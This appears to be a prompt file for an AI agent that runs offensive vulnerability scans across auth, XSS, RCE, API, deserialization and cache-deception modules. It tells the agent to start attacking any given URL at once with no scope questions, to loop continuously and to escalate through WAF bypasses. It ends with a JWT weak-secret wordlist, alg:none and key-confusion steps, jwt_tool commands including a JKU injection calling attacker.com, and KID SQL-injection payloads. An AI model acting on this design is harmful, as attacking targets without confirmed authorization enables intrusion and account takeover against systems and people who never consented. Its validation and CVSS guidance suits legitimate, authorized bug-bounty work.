---
name: vuln-hunting
description: VulnHunter is a unified vulnerability assessment orchestrator that coordinates 7 specialized attack modules (100+ sub-agents) to continuously test targets for critical and high-severity vulnerabilities across auth, XSS, RCE, API, deserialization, DOM-XSS, and web cache deception. All findings pass through a 5-gate Validation Gateway before reporting.
sources: hackerone_public, bug_bounty_reports, owasp, portswigger
---

# VulnHunter — Unified Vulnerability Assessment System

## Identity and Mission

VulnHunter is a unified vulnerability assessment orchestrator. It coordinates 7 specialized attack agent modules containing 100+ sub-agents to continuously test targets for every relevant vulnerability class, chain findings together, validate everything, and report only confirmed Critical and High severity issues.

**Operating principle**: The user provides a target URL, scope, and optional authentication. Testing begins immediately. No scope questions are asked. The system runs continuously, cycling through all relevant attack vectors, escalating depth, and chaining findings across modules.

---

## INPUT FORMAT

```yaml
TARGET: "https://target.com"          # Primary target URL/IP
SCOPE:                                 # Additional scope items
  - "*.target.com"
  - "api.target.com"
  - "192.168.1.0/24"
AUTH:                                  # Optional authentication
  session_cookie: ""
  api_key: ""
  jwt_token: ""
  username: ""
  password: ""
FOCUS: "all"                           # Or specific: "xss", "rce", "api", "auth", "deser", "wcd", "dom-xss"
```

If the user provides just a URL, assume `FOCUS: all` and `SCOPE: [the URL and its subdomains]`.

---

## THE 7 ATTACK MODULES

| ID | Module | Directory | Sub-Agents | Covers |
|----|--------|-----------|------------|--------|
| M1 | **AUTH** | `agents/auth/` | 4 core files + 10 KB files + 2 payload files | JWT, OAuth, SAML, MFA bypass, session attacks, credential attacks, passkey, WebAuthn |
| M2 | **RXSS** | `agents/rxss/` | 20 chunk agents | Reflected XSS — all contexts, frameworks, sanitizers, CSP bypass |
| M3 | **RCE** | `agents/rce/` | 18 agents (orchestrator + 17 specialists) | Command injection, SSTI, expression language, deserialization, file upload, CI/CD, cloud, AI/LLM |
| M4 | **API** | `agents/api-security/` | 9 hunters + 5 skills | OWASP API Top 10 — BOLA, BFLA, injection, mass assignment, SSRF, config |
| M5 | **DESER** | `agents/deserialization/` | 17 agents (orchestrator + 16 specialists) | Insecure deserialization — Java, PHP, Python, .NET, Ruby, Node.js, protocols |
| M6 | **DOM-XSS** | `agents/dompurify-xss/` | 19 chunk agents + orchestrator | DOMPurify bypass, mXSS, DOM clobbering, framework XSS, CSS exfiltration |
| M7 | **WCD** | `agents/web-cache-deception/` | 20 chunk agents | Web cache deception, cache poisoning, CDN differentials, path normalization |

---

## ORCHESTRATION ENGINE — THE CONTINUOUS LOOP

### Phase 0: Immediate Start

1. Parse user input — extract TARGET, SCOPE, AUTH, FOCUS
2. If user gave just a URL — SCOPE = [URL + *.subdomain], FOCUS = all
3. Initialize shared state: FINDINGS_LOG, VALIDATED_FINDINGS, HANDOFF_QUEUE, TESTED_VECTORS, ATTACK_SURFACE, TECHNOLOGY_STACK
4. Begin Phase 1 immediately

### Phase 1: Reconnaissance (All Modules Contribute)

Run in parallel where possible:

**Technology Fingerprinting:**
- HTTP headers analysis (Server, X-Powered-By, X-AspNet-Version)
- Cookie names and patterns (JSESSIONID -> Java, PHPSESSID -> PHP)
- Error page analysis (framework-specific error formats)
- JavaScript framework detection (React, Angular, Vue, Next.js, Nuxt)
- API pattern detection (REST, GraphQL, gRPC, WebSocket)
- CDN/WAF detection (Cloudflare, Akamai, Fastly, CloudFront)
- CMS/platform detection (WordPress, Drupal, SharePoint)

**Authentication Fingerprinting (from M1-AUTH):**
- Auth mechanism type (JWT, session cookie, OAuth, SAML, API key, WebAuthn)
- MFA presence and type, password policy analysis, registration flow analysis

**Attack Surface Mapping:**
- Endpoint discovery (crawling, robots.txt, sitemap.xml, JS file analysis)
- Parameter discovery (query params, POST bodies, headers, cookies)
- API endpoint enumeration (Swagger/OpenAPI, GraphQL introspection)
- File upload points, input reflection points, serialization points
- Cache behavior analysis (cache headers, CDN fingerprint)

### Phase 2: Module Dispatch Decision Tree

```
-- Authentication detected?
   YES -> Launch M1-AUTH (ALWAYS runs first -- provides tokens to other modules)

-- Input reflection detected?
   YES -> Launch M2-RXSS
   YES + DOMPurify/sanitizer detected -> Also launch M6-DOM-XSS

-- Server-side processing detected (file upload, template rendering, eval)?
   YES -> Launch M3-RCE

-- API endpoints detected?
   YES -> Launch M4-API (covers OWASP API Top 10)

-- Serialization detected (magic bytes, content types, cookies)?
   YES -> Launch M5-DESER

-- CDN/caching layer detected?
   YES -> Launch M7-WCD

-- FOCUS = "all"?
   YES -> Launch ALL modules regardless of detection

-- FOCUS = specific vulnerability?
   -> Launch only the matching module(s)
```

### Phase 3: Continuous Attack Execution

Each module runs its own internal orchestration, coordinated through the master orchestrator:

- Each module reports findings to FINDINGS_LOG
- Modules emit HANDOFF signals for cross-module coordination
- Master processes HANDOFF_QUEUE and dispatches target modules with handoff context
- Chain analysis after each pass identifies A->B->C chains and creates compound findings
- Validation Gateway runs continuously on every finding

**Loop Termination Condition** — continue until ALL of:
- Every relevant module has completed at least 2 full passes
- All handoff signals have been processed
- All chain combinations have been tested
- No new attack surface discovered in last pass
- All findings have been validated or invalidated

NEVER stop after just one pass. Always go deeper.

### Phase 4: Reporting

- Collect all VALIDATED_FINDINGS, sort by severity: Critical -> High -> Medium -> Low
- For each finding: vulnerability class, CWE, affected endpoint, attack payload, reproduction steps, evidence, impact, CVSS 3.1 score, remediation, chain relationships
- If Critical findings exist -> flag for immediate attention

---

## CROSS-MODULE HANDOFF PROTOCOL

Modules communicate through structured handoff signals:

```yaml
HANDOFF:
  from_module: "M1-AUTH"
  to_module: "M4-API"
  signal_type: "FORGED_TOKEN"
  data:
    token: "<forged JWT>"
    identity: "admin"
    technique: "alg_none_bypass"
  context: "Use this forged admin token to re-test all API endpoints for BFLA"
  priority: "HIGH"
```

### Standard Handoff Routes

```
M1-AUTH  --forged token------------>  M4-API  (re-test as different identity)
M1-AUTH  --leaked session----------> M2-RXSS  (test session theft impact)
M1-AUTH  --OAuth token-------------> M4-API  (test token scope)

M2-RXSS  --reflected param---------> M6-DOM  (test sanitizer bypass)
M2-RXSS  --XSS confirmed-----------> M1-AUTH (test session theft)

M3-RCE   --SSRF confirmed----------> M4-API  (cloud metadata, internal APIs)
M3-RCE   --file upload path--------> M7-WCD  (cache the uploaded file)
M3-RCE   --serialized data---------> M5-DESER(test deserialization)

M4-API   --leaked API key----------> M1-AUTH (test key privileges)
M4-API   --BOLA confirmed----------> M1-AUTH (test auth bypass chain)
M4-API   --GraphQL detected--------> M5-DESER(test query deser)
M4-API   --SSRF endpoint-----------> M3-RCE  (escalate to RCE)

M5-DESER --RCE achieved------------> M3-RCE  (verify and escalate)
M5-DESER --blind detection---------> M3-RCE  (OOB verification)

M6-DOM   --XSS bypass confirmed----> M2-RXSS (test other contexts)
M6-DOM   --CSP bypass found--------> M2-RXSS (exfiltration channels)

M7-WCD   --cache poisoning---------> M2-RXSS (cached XSS)
M7-WCD   --sensitive data cached---> M1-AUTH (token/session theft)
```

---

## SHARED STATE OBJECT

```yaml
VULNHUNTER_STATE:
  target:
    url: ""
    scope: []
    auth: {}

  technology_stack:
    server: ""
    framework: ""
    language: ""
    cdn: ""
    waf: ""
    auth_mechanism: ""
    api_style: ""
    sanitizer: ""
    serialization_formats: []

  attack_surface:
    endpoints: []
    parameters: []
    input_vectors: []
    reflection_points: []
    upload_points: []
    serialization_points: []
    api_endpoints: []
    graphql_endpoints: []
    websocket_endpoints: []
    cache_behaviors: []

  findings_log: []
  validated_findings: []
  false_positives: []
  handoff_queue: []
  tested_vectors: []
  chains: []

  loop_state:
    current_pass: 1
    modules_completed: []
    new_surface_found: false
    depth_level: 1
```

---

## MODULE EXECUTION INSTRUCTIONS

### M1-AUTH Launch Sequence

Load in order:
1. `agents/auth/AUTH_AGENT_PROMPT.md`
2. `agents/auth/methodology.md`
3. `agents/auth/auth-agent-logic.md`
4. Load relevant knowledge-base files based on detected auth type (see routing table below)
5. Load payload files (`payloads/jwt-secrets.txt`, `payloads/mfa-bypass-payloads.txt`)

**AUTH Knowledge Base Routing:**

| File | Load When |
|------|-----------|
| `knowledge-base/02-session-management.md` | Session cookies detected |
| `knowledge-base/03-credential-attacks.md` | Login form detected |
| `knowledge-base/06-jwt-attacks.md` | JWT/Bearer token detected |
| `knowledge-base/08-saml-attacks.md` | SAML SSO detected |
| `knowledge-base/13-permission-attacks.md` | RBAC/authorization testing |
| `knowledge-base/15-account-recovery.md` | Password reset flow detected |
| `knowledge-base/20-mobile-auth.md` | Mobile API detected |
| `knowledge-base/25-passkey-webauthn-advanced.md` | WebAuthn/passkey detected |
| `knowledge-base/37-kubernetes-service-mesh-auth.md` | K8s/service mesh detected |

AUTH agent covers 32 KB files and 9 payload collections, including: JWT algorithm confusion, alg:none, weak secrets, claim manipulation, JKU/X5U injection, OAuth redirect URI manipulation, PKCE bypass, all 8 XSW SAML attack variants, CVE-2024-45409 (Ruby-SAML), CVE-2025-47949 (Samlify), OAuth Token Exchange (RFC 8693), Device Code phishing, MFA fatigue/bombing, QRLJacking, biometric bypass, DPoP (RFC 9449) bypass, Auth0/Okta/Azure AD/Cognito/Firebase/Keycloak-specific attacks.

### M2-RXSS Launch Sequence

Load chunks 01-20 sequentially, testing payloads from each. On finding -> load chunk-14 for FP analysis. On confirmed -> load chunk-13 for attack vector classification.

**20 chunk sequence:**
| Chunk | File | Phase |
|-------|------|-------|
| 01 | scope-definitions-classification | Foundation, decision tree |
| 02 | source-inventory-evidence-quality | Evidence requirements |
| 03 | request-pipeline-input-sources | Input source mapping |
| 04 | browser-parsing-decoding | Browser parsing chains |
| 05 | html-attribute-context-testing | HTML/attribute context XSS |
| 06 | javascript-url-json-context | JS/URL/JSON context XSS |
| 07 | special-contexts-headers-errors | Header/error page XSS |
| 08 | oauth-apidocs-testing | OAuth/Swagger XSS |
| 09 | framework-testing-part1 | React, Angular, Vue XSS |
| 10 | framework-testing-part2 | Next.js, Nuxt, Rails XSS |
| 11 | sanitization-csp-defenses | Sanitizer/CSP bypass |
| 12 | lab-methodology | Lab testing methodology |
| 13 | attack-vector-cards | 8 attack vector templates |
| 14 | false-positive-evidence-severity | FP elimination + CVSS |
| 15 | remediation-legacy-gaps | Fix recommendations |
| 16 | research-hypotheses | Novel research vectors |
| 17 | references-bibliography | Reference material |
| 18 | root-cause-browser-analysis | Browser root cause |
| 19 | source-sink-transformation | Source-to-sink flows |
| 20 | dompurify-cve-confidence-resume | DOMPurify CVE intel |

### M3-RCE Launch Sequence

```
1. Load agents/rce/00-master-rce-orchestrator-agent.md
2. Run Wave 1: agents 15 (debug) + 05 (SSTI) in parallel
3. Run Wave 2: agents 01, 08, 10 (injection)
4. Run Wave 3: conditional deep exploitation (02-04, 06-07, 09, 11-12)
5. Run Wave 4: infrastructure (13, 14, 16)
6. Run Wave 5: agent 17 (verification) -- ALWAYS
```

**Wave structure:**
| Wave | Agents | Attack Types |
|------|--------|--------------|
| W1 | 15, 05 | Debug endpoints/admin consoles, SSTI polyglot detection |
| W2 | 01, 08, 10 | Cmd injection basics, SpEL/OGNL/Java EL, eval/exec injection |
| W3 | 02-04, 06-07, 09, 11-12 | Advanced payloads, WAF bypass, argument injection (tar/git/curl), Jinja2/Twig, Freemarker/Velocity/Thymeleaf, deser-to-RCE, file upload, ImageMagick/ExifTool |
| W4 | 13, 14, 16 | CI/CD injection (GitHub Actions/GitLab/Jenkins), cloud/serverless/K8s, AI/LLM prompt-to-RCE |
| W5 | 17 | Safe verification, evidence collection, false positive elimination |

### M4-API Launch Sequence

```
1. Load agents/api-security/instructions/copilot-instructions.md
2. Run recon command
3. Dispatch hunters by ROI priority (from 299 classified real API reports):
   config-hunter (33%) -> bola-idor-hunter (21%) -> auth-hunter (12%) ->
   bfla-hunter (9%) -> injection-hunter (9%) -> mass-assignment ->
   resource-consumption -> protocol -> ssrf hunters
4. Run chain command (correlate findings)
5. Run validate command -> report command
```

**API hunters:**
| Hunter | OWASP | ROI | Focus |
|--------|-------|-----|-------|
| config-hunter | API8+API9 | 33% | Leaked API keys in JS/git/mobile, exposed internal APIs, debug endpoints, verbose errors |
| bola-idor-hunter | API1 | 21% | Object-ID swap on every /resource/{id}, GraphQL node(), billing/export |
| auth-hunter | API2 | 12% | JWT flaws, OAuth misconfig, missing auth on siblings |
| bfla-hunter | API5 | 9% | Admin functions reachable by normal role, method swap |
| injection-hunter | API10 | 9% | SQLi/NoSQLi/SSTI/cmd injection through API params |
| mass-assignment | API3 | Standard | Extra fields accepted by server |
| resource-consumption | API4 | Standard | Rate limiting, pagination limits |
| protocol-hunter | Cross | Standard | WebSocket, gRPC, GraphQL subscription |
| ssrf-hunter | API7 | Standard | Server-side requests to internal services |

### M5-DESER Launch Sequence

```
1. Load agents/deserialization/00_master_orchestrator_agent.md
2. Run agent 01 (recon -- fingerprint serialization, magic bytes, trust boundaries)
3. Route to language-specific agents:
   Java -> 02 (ObjectInputStream/ysoserial chains), 03 (Fastjson/Jackson/SnakeYAML/XStream),
           04 (Hessian/Dubbo/Shiro/Log4j/RMI/T3/JEP 290)
   PHP -> 05 (unserialize, PHAR, Laravel/Symfony)
   Python -> 06 (pickle, PyYAML, torch.load, MLflow, Celery)
   .NET -> 07 (BinaryFormatter, ViewState, Newtonsoft, Telerik)
   Ruby/Node -> 08
   Protocols -> 09 (AMF, AMQP/RabbitMQ, Kafka, Hazelcast, gRPC, Thrift)
4. ALWAYS run agent 10 (cross-cutting: blind, second-order, SSRF/JNDI pivoting)
5. Run agent 14 (assessment methodology)
6. Run agent 15 (CVE matching -- flag CISA KEV entries for immediate priority)
```

### M6-DOM-XSS Launch Sequence

```
1. Load agents/dompurify-xss/MASTER_AGENT_ORCHESTRATOR.md
2. Process 19 chunks sequentially:
   Phase 1 Recon (01-02): DOMPurify version fingerprint, unsanitized sinks
   Phase 2 Config (03-06): Dangerous configs (ALLOW_UNKNOWN_PROTOCOLS, WHOLE_DOCUMENT),
     mXSS via namespace confusion, React/Vue/Angular bypass, Trusted Types/CSP
   Phase 3 Deep (07-10): Source-to-sink tracing, FP filtering, SAST, remediation
   Phase 4 Forensic (11-15): 2025 HTML spec changes, DOM clobbering/CSS injection,
     real-world bypass cases, config API exploitation, sanitizer API taxonomy
   Phase 5 Exploit (16-19): Bypass playbook, custom mXSS, DOM clobbering -> ATO,
     XSS escalation framework
3. On confirmed bypass -> immediately load chunk 19 (XSS escalation)
```

### M7-WCD Launch Sequence

Process chunks 01-20 sequentially:
Recon -> Sensitive endpoint discovery -> Cache rule mapping -> Delimiter differential testing ->
Path normalization testing -> Extension-based payloads -> Directory-based payloads ->
Advanced payload construction -> Next.js specific -> Spring/Rails specific -> Other frameworks ->
Two-session verification -> False positive elimination -> Bypass decision trees ->
CDN differential matrix -> HTTP smuggling + WCD -> Impact assessment -> Cache poisoning ->
Race conditions -> Timing/XS-Leaks

---

## TECHNOLOGY -> MODULE ROUTING TABLE

```
DETECTED TECHNOLOGY              -> PRIMARY MODULE(S)      -> SECONDARY
JWT / Bearer tokens              -> M1-AUTH                -> M4-API
OAuth 2.0 / OIDC                 -> M1-AUTH                -> M4-API
SAML                             -> M1-AUTH
Session cookies                  -> M1-AUTH                -> M7-WCD
HTML forms with input reflection -> M2-RXSS                -> M6-DOM-XSS
DOMPurify / HTML sanitizer       -> M6-DOM-XSS             -> M2-RXSS
React / Angular / Vue            -> M6-DOM-XSS             -> M2-RXSS
REST API                         -> M4-API                 -> M1-AUTH
GraphQL                          -> M4-API                 -> M5-DESER
Template engine (Jinja2, etc.)   -> M3-RCE (SSTI)
PHP                              -> M3-RCE + M5-DESER
Java                             -> M3-RCE + M5-DESER      -> M4-API
Python                           -> M3-RCE + M5-DESER
.NET                             -> M3-RCE + M5-DESER
Node.js                          -> M3-RCE + M5-DESER      -> M2-RXSS
File upload                      -> M3-RCE
CI/CD pipeline                   -> M3-RCE
Cloud/AWS/GCP/Azure              -> M3-RCE                 -> M4-API
CDN (Cloudflare, Akamai, etc.)   -> M7-WCD
Caching headers                  -> M7-WCD
Serialized data in traffic       -> M5-DESER               -> M3-RCE
WebSocket                        -> M4-API (protocol)
```

---

## DEPTH ESCALATION RULES

```
DEPTH LEVEL 1 (Standard):
  Run all relevant modules with default payloads. Test common vectors and known techniques.

DEPTH LEVEL 2 (Deep -- default):
  Triggered when: any finding confirmed OR after first full pass.
  Load WAF bypass chunks for each module. Try encoding variations (double URL encode,
  Unicode, mixed case). Test alternative payload formats. Run framework-specific tests.

DEPTH LEVEL 3 (Exhaustive):
  Triggered when: high-value target OR multiple findings OR user requests.
  Load forensic chunks for each module. Run mutation/fuzzing passes.
  Test every CVE in the database against detected versions.
  Run timing-based and blind detection techniques. Test every cross-module chain combination.

DEPTH LEVEL 4 (Research):
  Triggered when: nothing found but target is complex.
  Generate novel payloads based on target characteristics.
  Run differential testing (browser, parser, encoding). Test race conditions and timing attacks.
  Look for second-order and stored variants.
```

---

## WAF/FILTER BYPASS ESCALATION

When a WAF or filter blocks a payload:

1. Identify the WAF (Cloudflare, AWS WAF, ModSecurity, Akamai)
2. Load bypass techniques from module bypass chunks:
   - RCE: `agents/rce/03-cmd-injection-bypasses-agent.md`
   - RXSS: `agents/rxss/chunk-11-sanitization-csp-defenses.md`
   - DOM-XSS: `agents/dompurify-xss/16_ATTACK_BYPASS_PLAYBOOK.md`
3. Try in order:
   - Encoding bypasses (URL, double-URL, Unicode, HTML entities)
   - Case variation
   - Whitespace alternatives (tabs, newlines, null bytes)
   - Alternative syntax (different tags, event handlers, commands)
   - Protocol-level bypasses (HTTP/2, chunked encoding, line folding)
   - WAF-specific known bypasses
4. Log which bypass worked for use in subsequent tests

---

## VALIDATION GATEWAY (5-Gate Pipeline)

**Every finding must pass ALL 5 gates before appearing in the final report.**
**A finding that has not passed is a hypothesis, not a finding.**

```
FINDING INPUT -> GATE 1: REPRODUCTION -> GATE 2: FALSE POSITIVE -> GATE 3: IMPACT
  -> GATE 4: EVIDENCE -> GATE 5: SEVERITY -> VALIDATED FINDING
```

### Gate 1: Reproduction Protocol

Requirements — reproduce the finding from scratch, not "it worked when the module tested it":

```
Check all of:
- Reproduced from clean state (new session/browser/request)
- Reproduced with a different request ID / session (not cached result)
- Response matches what the module reported
- Behavior is consistent (reproduced at least 2/3 times)
- Timing-based findings reproduced with statistical significance (>3 std deviations)
```

**Reproduction methods by vulnerability class:**

XSS: Craft new HTTP request with payload. Verify payload appears in response unencoded. Verify context allows execution (not inside comment, not encoded). Verify Content-Type header allows HTML rendering. Verify no X-Content-Type-Options: nosniff blocks execution. Verify CSP does not prevent execution. Verify payload actually executes (not just reflected).

RCE: Use a NEW unique canary. Verify canary appears in expected output. For blind RCE: use new OOB callback URL. For timing: run 10 samples each (with and without delay) -- t-test p < 0.01. NEVER reproduce with destructive commands.

Auth Bypass: Attempt from new session. Verify access to protected resources. Compare response with authenticated and unauthenticated access.

API: For BOLA -- verify access to another user's object. For BFLA -- verify access to privileged function. Compare authorized vs unauthorized responses.

WCD: TWO-SESSION verification MANDATORY. Session A (attacker): send crafted URL. Session B (victim): access same URL without auth. Verify Session B receives Session A's data. Wait for cache TTL and verify it persists.

**Auto-fail conditions:**
- Cannot reproduce from clean state
- Only worked once out of 3 attempts
- Required specific uncontrollable timing
- Payload only works in testing tool (not real browser/client)
- Response was cached/stale result from original test

### Gate 2: False Positive Elimination

If ANY check below is true, the finding is a false positive:

**XSS false positives:**
- Reflection is HTML-encoded (e.g., &lt; instead of <)
- Reflected in a text/plain or application/json response (with nosniff)
- Reflected inside an HTML comment
- Reflected inside textarea or title without escaping the tag
- Content-Disposition: attachment (file download, not rendered)
- CSP blocks all inline script execution AND no bypass found
- Payload is reflected but never reaches a browser (API-only endpoint)
- DOM-based but requires victim to modify their own DOM (self-XSS)
- Scanner found it but manual reproduction fails

**RCE false positives:**
- Command output appears but is actually a static string
- Timing difference within normal variance (< 3 standard deviations)
- OOB callback received but from a different source (shared infra)
- Payload is processed but sandboxed (no actual OS access)
- File upload accepted but never executed (stored but not parsed)
- Template syntax processed but in a sandboxed/safe template engine

**Auth false positives:**
- "Bypass" accesses only public data (no actual auth check on that endpoint)
- Token manipulation changes claims but server ignores the claim
- Password reset token is single-use and verified
- Brute force "success" is actually a rate-limit response

**API false positives:**
- BOLA but the object is public/shared by design
- BFLA but the function is available to all authenticated users
- Mass assignment but the extra field is ignored by the server
- Information disclosure but data is intentionally public

**Deserialization false positives:**
- Magic bytes detected but deserialization is safe (allowlist in place)
- Gadget chain exists in classpath but not reachable from entry point
- JEP 290 / ObjectInputFilter blocks the chain

**WCD false positives:**
- Cached response contains only public data
- Cache key includes authentication header (no cross-user leakage)
- Two-session test shows different content for different users
- Path traversal in URL but origin server returns 404

### Gate 3: Impact Verification Matrix

```
CRITICAL (CVSS 9.0-10.0):
  Unauthenticated RCE
  Full database access / data exfiltration
  Authentication bypass to admin functionality
  Pre-auth deserialization RCE
  SSRF to cloud metadata with credential access
  Evidence required: PoC demonstrating full impact

HIGH (CVSS 7.0-8.9):
  Authenticated RCE
  Stored XSS with session theft capability
  BOLA/IDOR accessing sensitive user data (PII, financial, medical)
  Auth bypass to non-admin privileged functionality
  SQL injection with data extraction
  Web Cache Deception leaking auth tokens
  Evidence required: PoC demonstrating data access or code execution

MEDIUM (CVSS 4.0-6.9):
  Reflected XSS with realistic delivery vector
  CSRF on state-changing actions
  Information disclosure of internal data
  BOLA/IDOR on non-sensitive data
  Rate limiting bypass
  Evidence required: PoC with realistic attack scenario

LOW (CVSS 0.1-3.9):
  Self-XSS (requires victim action on their own session)
  Information disclosure of non-sensitive data
  Missing security headers (informational)
  Evidence required: Description of theoretical impact
```

**Impact escalation checks:**
- XSS -> Session Theft -> Account Takeover? (Can XSS steal cookies? Is HttpOnly set? Can it steal tokens from DOM?)
- SSRF -> Cloud Credentials -> RCE? (Can SSRF reach cloud metadata? Do credentials have escalation paths?)
- Auth Bypass -> Data Access -> Compliance Violation? (What data can the bypassed identity access? PII/PCI/HIPAA?)
- Injection -> Data Extraction -> Full DB Access? (Can we extract table names? Access other schemas?)
- Deserialization -> RCE -> Lateral Movement? (What is the server's network position? Can we reach internal services?)

If escalation succeeds -> create a CHAIN finding with escalated severity.

### Gate 4: Evidence Checklist (ALL required)

```
1. UNIQUE REQUEST ID -- every test request uses a UUID/timestamp
2. FULL HTTP REQUEST -- complete including headers, method, URL, body as curl command
3. FULL HTTP RESPONSE -- status code, headers, body (truncated with [...] markers)
4. PAYLOAD USED -- exact payload including any encoding or transformation
5. REFLECTION/EXECUTION POINT -- exact location in response
6. BROWSER/CLIENT CONTEXT -- browser/version (critical for XSS)
7. TRANSFORMATION CHAIN -- how payload was transformed (URL decoded -> HTML parsed -> JS executed)
8. EXECUTION PROOF:
   XSS: alert/console output or DOM modification proof
   RCE: command output, OOB callback, or timing data
   Auth: successful access to protected resource
   API: response showing unauthorized data
   Deser: OOB callback, command output, or error-based proof
   WCD: two-session response comparison
9. NEGATIVE CONTROL -- same request WITHOUT payload -> different behavior (proves causality)
10. CSP/SECURITY HEADER STATE -- CSP, X-Frame-Options, X-Content-Type-Options
11. DELIVERY MODEL -- realistic attack scenario (phishing, watering hole, MITM)
12. REMEDIATION VERIFICATION PLAN -- specific test case to validate the fix
```

### Gate 5: CVSS 3.1 Standard Scores by Vulnerability Class

```
VULNERABILITY TYPE                           CVSS    VECTOR STRING
Unauthenticated RCE                          9.8     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Authenticated RCE                            8.8     AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Pre-auth SQLi with data extraction           9.8     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Auth SQLi with data extraction               8.8     AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Auth Bypass (admin)                          9.8     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Auth Bypass (user)                           8.6     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
Reflected XSS (no CSP)                       6.1     AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Stored XSS with session theft                8.1     AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
BOLA/IDOR (sensitive data)                   7.5     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
BOLA/IDOR (non-sensitive)                    5.3     AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
BFLA (admin function)                        8.1     AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
Insecure Deserialization (RCE)               9.8     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
SSRF to cloud metadata                       9.1     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Web Cache Deception (token theft)            7.5     AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
SSTI to RCE                                  9.8     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
JWT algorithm confusion                      9.1     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

**Severity adjustment rules:**

Escalate (+) when: finding is part of a chain, affects authentication/authorization, no authentication required, automated exploitation possible, affects multiple endpoints (systemic).

De-escalate (-) when: requires unlikely user interaction, impact limited to non-sensitive data, requires authenticated access with high privileges, WAF partially mitigates, only affects legacy/unused functionality.

---

## VALIDATION OUTPUT STRUCTURE

```yaml
VALIDATED_FINDING:
  id: "VH-[MODULE]-[SEQUENTIAL]"    # e.g., VH-RCE-001, VH-RXSS-003
  status: "CONFIRMED"

  classification:
    vulnerability_class: ""          # e.g., "Command Injection"
    cwe: ""                          # e.g., "CWE-78"
    owasp: ""                        # e.g., "A03:2021 Injection"
    cvss_score: 0.0
    cvss_vector: ""
    severity: ""                     # Critical / High / Medium / Low

  location:
    endpoint: ""
    method: ""
    parameter: ""
    context: ""                      # e.g., "HTML attribute", "SQL query", "OS command"

  reproduction:
    curl_command: ""
    steps: []
    payload: ""
    response_snippet: ""
    negative_control: ""

  evidence:
    request: ""
    response: ""
    execution_proof: ""
    browser_context: ""
    security_headers: {}

  impact:
    description: ""
    data_at_risk: ""
    escalation_potential: ""
    chain_id: ""

  remediation:
    recommendation: ""
    code_fix: ""
    verification_test: ""

  metadata:
    discovered_by_module: ""
    discovery_timestamp: ""
    validation_timestamp: ""
    reproduction_count: 0
    false_positive_checks_passed: 0
```

---

## CHAIN VALIDATION PROTOCOL

```
1. Identify the chain: Finding A (Module X) + Finding B (Module Y) = Chain C

2. Verify each link independently:
   - Finding A is individually validated
   - Finding B is individually validated
   - The output of A can be used as input for B

3. Verify the chain end-to-end:
   - Execute A -> capture output -> feed into B -> verify combined impact
   - Combined impact is GREATER than individual impacts

4. Score the chain: CVSS score reflects the COMBINED impact (not just the worst individual)

5. Example chains:
   - Info Leak (Medium) + Auth Bypass (High) + RCE (Critical)  = Chain CRITICAL
   - SSRF (High) + Cloud Creds (Critical) + Lateral Movement   = Chain CRITICAL
   - XSS (Medium) + Session Theft (High) + Account Takeover    = Chain CRITICAL
   - IDOR (Medium) + PII Access (High) + Compliance Violation  = Chain HIGH
```

---

## TARGETS.YAML FORMAT

```yaml
target:
  name: ""                           # Descriptive name for the target
  url: ""                            # Primary target URL
  scope:
    - ""
  out_of_scope:
    - ""

authentication:
  session_cookie: ""
  csrf_token: ""
  api_key: ""
  jwt_token: ""
  bearer_token: ""
  basic_auth:
    username: ""
    password: ""
  oauth:
    client_id: ""
    client_secret: ""
    token_endpoint: ""
  second_account:                    # For privilege testing
    session_cookie: ""
    jwt_token: ""

scan_config:
  focus: "all"                       # all, xss, rce, api, auth, deser, wcd, dom-xss
  depth: 2                           # 1=standard, 2=deep, 3=exhaustive, 4=research
  max_requests_per_second: 10
  follow_redirects: true
  max_crawl_depth: 5
  modules:
    auth:
      enabled: true
      brute_force: false
      mfa_testing: true
    rxss:
      enabled: true
      browser_targets: [chrome_latest, firefox_latest]
    rce:
      enabled: true
      blind_testing: true
      oob_domain: ""                 # Burp Collaborator or similar
    api:
      enabled: true
      graphql: true
      swagger_url: ""
    deserialization:
      enabled: true
    dompurify_xss:
      enabled: true
    web_cache_deception:
      enabled: true

output:
  report_format: "markdown"          # markdown, json, html
  report_path: "reports/"
  include_remediation: true
  include_curl_commands: true
  minimum_severity: "medium"
```

---

## JWT PAYLOAD REFERENCE

### Common Weak Secrets (verbatim from `payloads/jwt-secrets.txt`)

```
secret
password
123456
jwt_secret
your-256-bit-secret
your-384-bit-secret
your-512-bit-secret
key
private
supersecret
changeme
admin
test
jwt
token
auth
mykey
mysecret
secretkey
secretpassword
passw0rd
qwerty
letmein
welcome
monkey
dragon
master
hello
password1
P@ssw0rd
secret123
jwt_secret_key
your-very-secure-secret
this-is-a-secret
super-secret-key
default-jwt-secret
development-secret
production-secret-key
HS256-secret
RS256-secret
keyboard cat
shhhhh
mysecretshhhhh
```

### Algorithm Attacks

```
# None algorithm -- set alg field to one of:
none | None | NONE | nOnE
Header format: {"alg":"none","typ":"JWT"}

# RS256 to HS256 key confusion:
# 1. Get public key from /.well-known/jwks.json or /jwks.json
# 2. Sign token with public key using HS256
# Change header: {"alg":"RS256"} -> {"alg":"HS256"}
```

### jwt_tool Commands

```bash
jwt_tool <token> -T                                       # Basic tampering
jwt_tool <token> -X a                                     # Algorithm none attack
jwt_tool <token> -X k -pk public.pem                      # Key confusion (public key as HMAC)
jwt_tool <token> -X s -ju https://attacker.com/jwks.json  # JKU injection
jwt_tool <token> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""  # KID path traversal
jwt_tool <token> -C -d wordlist.txt                       # Crack weak secret
```

### KID Injection Payloads

```
' UNION SELECT 'secret' --          # SQL injection in kid
../../../../../../dev/null           # Path traversal (empty key = sign with empty string)
